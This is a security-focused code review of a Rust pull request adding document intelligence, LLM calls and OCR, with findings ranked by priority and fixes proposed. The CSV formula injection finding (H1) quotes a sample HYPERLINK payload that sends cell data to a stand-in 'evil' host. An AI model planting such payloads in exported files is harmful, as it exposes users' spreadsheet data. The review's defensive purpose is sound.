# Code Review — PR #27 (crates/) "Markhand document intelligence + BRD/PRD handoff suite"

Scope: `git diff 3c6de6b^1 3c6de6b -- crates/`. Focus per assignment: `intelligence.rs`, `llm.rs`, `llm_cli.rs`; scanned `image_ocr.rs`, `viet_legacy.rs`, `chunk.rs`, CLI handoff handler, and the rest of the diff for panics/injection.

## Scope
- New: `intelligence.rs` (1910), `intelligence_tests.rs` (470), `llm_cli.rs` (444), `viet_legacy_maps.rs` (277), `pptx_preview.rs` (+510).
- Changed: `llm.rs` (+955), `image_ocr.rs` (+378), `docx.rs` (+285), `viet_legacy.rs`, `csv_conv.rs`, `xlsx.rs`, `audio.rs`, `chunk.rs`, `lib.rs`, `cli/main.rs`, `mcp/main.rs`.
- Approx net LOC added: ~5.6k.

## Overall Assessment
Security-sensitive surfaces (subscription-CLI spawning, HTTP LLM calls, OCR subprocess) are handled with more care than typical: no shell interpolation, API-key env stripping, stderr suppression, binary allowlisting, request timeouts, formula-guarded CSV export in the primary path. The document-intelligence engine is almost entirely pure/deterministic string processing with good test intent coverage. The real defects are a small set of **offset-driven panics** and **one inconsistent CSV-sanitization path**, both concentrated in `intelligence.rs`. No API-key leakage, command injection, or memory-unsafety found in production code.

## Critical Issues
None found. No key logging/committing, no shell/command injection, no `unsafe`, no production `unwrap` on untrusted input (the `unreachable!()` arms in `llm.rs:632,977` are genuinely unreachable — subscription CLI is dispatched earlier).

## High Priority

### H1 — CSV formula injection in `09-JIRA-IMPORT.csv` (guard bypassed)
`intelligence.rs:1459-1469`. The JIRA export hand-builds CSV with only quote-doubling (`story.text.replace('"', "\"\"")`) and does **not** apply the formula-prefix guard that `table_to_csv` deliberately uses (`intelligence.rs:888` prepends `'` for cells starting with `= + - @`). Story text can originate from untrusted document content: the explicit-story extraction path at `intelligence.rs:1223-1236` copies the raw line (`clean.to_string()`), and `clean` only strips leading `- * • ▪ \t`, not `=/+/-/@`.

Concrete failure: a source document contains a line such as `=HYPERLINK("http://evil/"&A1,"click") tôi muốn ...`. It matches the story extractor (line contains "tôi muốn"), is written verbatim into `09-JIRA-IMPORT.csv` as `"=HYPERLINK(...) tôi muốn ..."`. When a BA/PM opens/imports that CSV in Excel or Google Sheets, the quotes are consumed as CSV delimiters and the cell is interpreted as a formula, enabling data exfiltration / DDE-style execution on the reviewer's machine. The codebase already knows this class (see `table_to_csv` + test `csv_neutralizes_all_formula_prefixes`), so this is an inconsistency, not an unknown risk. Fix: route JIRA cells through the same formula-neutralizing helper (and prefer the `csv` crate writer over manual quoting to also handle embedded quotes/commas robustly).

## Medium Priority

### M1 — `redact_pii` can panic on a non-char-boundary offset
`intelligence.rs:719-731`. The span filter checks only `finding.end <= output.len() && finding.start < finding.end` (line 723); it does **not** verify char boundaries before `output.replace_range(start..end, ...)`. `replace_range` panics if `start` or `end` fall inside a multi-byte UTF-8 sequence. `PiiFinding` is `Serialize`/`Deserialize`, so offsets round-trip through the desktop frontend and can be applied against markdown that was edited after detection.

Concrete failure: detect PII on a document, user edits the markdown (shifting byte offsets — Vietnamese text is heavily multi-byte, so a shifted offset very likely lands mid-character), then calls `redact_pii` with the stale findings → backend thread panics, aborting the command. The existing test `redaction_ignores_out_of_range_findings` only exercises `start=100 > len` (filtered out) and does not cover the mid-character case. Fix: additionally require `output.is_char_boundary(start) && output.is_char_boundary(end)` in the filter.

### M2 — `update_markdown_table` can panic on a non-char-boundary span
`intelligence.rs:868-880`. Same class as M1: guards `table.end > markdown.len() || table.start > table.end` but not char boundaries before `updated.replace_range(table.start..table.end, ...)`. `MarkdownTable` offsets are serializable; applying a table span parsed from one revision against an edited markdown (or a different document) panics. Fix: add `is_char_boundary` checks (or search-and-verify the span) before replacing.

### M3 — Citation offsets silently drift on CRLF / whitespace-normalized documents
`intelligence.rs:427-430` combined with `chunk.rs:40-92`. `build_corpus` locates each chunk with `document.markdown[cursor..].find(&chunk.text)` and falls back to `cursor` when not found (`unwrap_or(cursor)`). But `chunk_markdown` builds chunk text by dropping heading lines, `trim()`-ing, and re-joining body lines with `\n` (`chunk.rs:44-52,61`). On CRLF input the rebuilt text contains `\n` where the source has `\r\n`, so `find` fails and the citation `start`/`end` collapse onto the previous chunk's end — wrong spans, emitted silently rather than as an error.

Concrete failure: on Windows (this project's primary target) a `.md`/converted doc with CRLF line endings produces `Citation.start/end` that no longer point at the quoted text; any UI highlight or grounding-verification keyed on those offsets is misaligned. The `corpus_offsets_do_not_panic_on_crlf_vietnamese` test only asserts no panic and `end >= start`, not offset correctness, so this is uncovered. Fix: normalize line endings before chunking, or carry true source offsets out of `chunk_markdown` instead of re-locating by substring search.

## Low Priority

### L1 — `watch_pattern_matches` uses unmemoized recursive backtracking
`intelligence.rs:1075-1093`. The `*` branch recurses `matches(&pattern[1..], text) || matches(pattern, &text[1..])`, which is exponential for adversarial patterns (many `*`) against a long non-matching name. File names are bounded (~255 chars) so impact is capped, but a pathological watch rule pattern could still stall the watcher thread. Low; consider an iterative two-pointer glob if watch rules are ever user-supplied at scale.

### L2 — Predictable temp file names in a world-shared directory
`image_ocr.rs:81,236` (`fileconv_ocr_{pid}_{seq}.png`), `llm_cli.rs:166-174` (`markhand-subscription-{pid}-{n}`), `intelligence.rs:1722` (zip temp). Names are predictable and land in `std::env::temp_dir()`. On a multi-user host an attacker could pre-create these paths as symlinks (the OCR path uses `save` which follows symlinks and truncates the target). Local-only, low severity; use `tempfile`/`O_EXCL`-style creation if hardening is desired. (The zip temp at `intelligence.rs:1727` already uses `create_new(true)`, which is the right pattern to replicate elsewhere.)

### L3 — Gemini API key placed in URL query string
`llm.rs:617,767,960` build `...:generateContent?key={api_key}` with a user-configurable `base_url`. This is Google's documented scheme, but keys in query strings are more prone to logging by intermediaries/access logs than headers, and if a user misconfigures `base_url` for a Gemini provider the key is sent to that host. Note: error text `LLM HTTP {status}: {text}` (`llm.rs:647`) returns the provider *body*, not the URL, so the key is not leaked through error propagation. Informational.

## Edge Cases Scouted
- `redact_pii` / `update_markdown_table`: offsets decoupled from the string they are applied to (M1/M2).
- CRLF documents: citation offset drift (M3); no panic (bounds are re-clamped and char-boundary-walked in `build_corpus:423-434`), just wrong values.
- Empty corpus: `generate_handoff_pack(&[])` correctly produces no items and `validation.ok == false` (test `empty_input_never_invents_requirements`).
- `three_way_merge` is whole-document granularity: any non-trivial divergence yields a single full-document conflict block. Not a defect, but callers should not expect line-level merges.
- Subscription CLI: prompt is delivered via **stdin**, never as an argv element (`llm_cli.rs:122-130`), and the binary is name-allowlisted (`llm_cli.rs:52-63`) — no command injection through document or config content.

## Positive Observations (risk-calibration)
- `llm_cli.rs`: env-strips `CURSOR_API_KEY`/`CODEX_API_KEY`/`OPENAI_API_KEY` (lines 95-97,323-325), drains stderr without surfacing OAuth URLs/tokens (line 158-159), enforces read-only/sandbox CLI flags with a test asserting it (`cli_arguments_enforce_read_only_modes`), and kills+reaps on timeout (lines 140-147). Strong.
- `image_ocr.rs`: all `tesseract`/`python3` invocations pass paths and languages as discrete `Command` args — no shell, no interpolation.
- Tests genuinely encode intent rather than just executing code: weak-grounding rejection, strict missing-citation, non-destructive redaction, CSV formula neutralization (for the `table_to_csv` path), unique IDs across identical documents, stable item IDs with a unique `pack_id`.

## Recommended Actions (priority order)
1. H1 — apply the formula-prefix guard (and ideally the `csv` crate writer) to the JIRA CSV export; audit `10-GITHUB-ISSUES.md`/`11-CONFLUENCE.md` for the same raw-text embedding (markdown, lower impact).
2. M1/M2 — add `is_char_boundary` checks in `redact_pii` and `update_markdown_table` before `replace_range`.
3. M3 — normalize line endings before `chunk_markdown`, or return true source offsets instead of substring-relocating chunks; then assert offset correctness (not just non-panic) for CRLF in tests.
4. L1/L2 — iterative glob; `O_EXCL`/`tempfile` for OCR/CLI temp files if multi-user hardening is in scope.

## Plan Task Status
No plan file was provided with this review; task-completion verification against a plan TODO list was not applicable.

## Unresolved Questions
- Does the desktop layer re-run `detect_pii`/`parse_markdown_tables` immediately before `redact_pii`/`update_markdown_table`, or can serialized offsets be applied against user-edited markdown? If the latter, M1/M2 are reachable in normal use, not just adversarial.
- Is `09-JIRA-IMPORT.csv` intended for direct spreadsheet/Jira import by end users? If yes, H1's blast radius is the reviewer's workstation and the fix should block landing.
